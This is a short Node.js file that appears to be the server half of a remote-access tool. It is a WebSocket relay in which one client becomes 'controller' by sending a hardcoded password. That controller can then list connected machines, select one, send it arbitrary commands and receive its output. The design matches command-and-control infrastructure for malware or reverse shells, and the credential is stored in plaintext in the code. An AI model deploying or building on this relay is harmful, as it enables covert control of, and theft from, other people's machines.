const WebSocket = require("ws");

let clients = new Map();
let controller = null;
let selectedClient = null;

module.exports = (req, res) => {
  if (res.socket.server.wss) {
    res.end();
    return;
  }

  const wss = new WebSocket.Server({ noServer: true });

  res.socket.server.on("upgrade", (req, socket, head) => {
    wss.handleUpgrade(req, socket, head, (ws) => {
      const clientId = req.socket.remoteAddress + ":" + req.socket.remotePort;
      clients.set(clientId, ws);
      console.log(`✅ Client connected: ${clientId}`);

      ws.on("message", (message) => {
        message = message.toString();
        console.log(`📥 Message from ${clientId}: ${message}`);

        // Controller authentication
        if (message === "Y@to$eecjm1228!") {
          controller = clientId;
          ws.send("✅ You are verified as Controller");
        }
        // Forward client message to controller
        else if (clientId === selectedClient && controller) {
          clients.get(controller)?.send(message);
        }
        // Controller sending commands
        else if (controller === clientId) {
          if (message === "client_lists") {
            showClients(ws);
          } else if (message.startsWith("select_client")) {
            const targetClient = message.split(" ")[1];
            selectClient(targetClient, ws);
          } else {
            sendCommand(message, ws);
          }
        }
        // Normal ACK for other clients
        else {
          ws.send("ACK");
        }
      });

      ws.on("close", () => {
        clients.delete(clientId);
        if (selectedClient === clientId) selectedClient = null;
        console.log(`❌ Client disconnected: ${clientId}`);
      });
    });
  });

  res.socket.server.wss = wss;
  res.end();
};

function showClients(ws) {
  let msg = "[ CLIENT LIST ]\n";
  clients.forEach((_, clientId) => {
    msg += `${clientId === controller ? "(controller)" : clientId}\n`;
  });
  ws.send(msg);
}

function selectClient(clientId, ws) {
  if (clients.has(clientId)) {
    selectedClient = clientId;
    ws.send(`✅ Client ${clientId} selected!`);
  } else {
    ws.send("❌ Client not found.");
  }
}

function sendCommand(command, ws) {
  if (selectedClient && clients.has(selectedClient)) {
    clients.get(selectedClient)?.send(command);
  } else {
    ws.send("❌ No client selected or client disconnected!");
  }
}
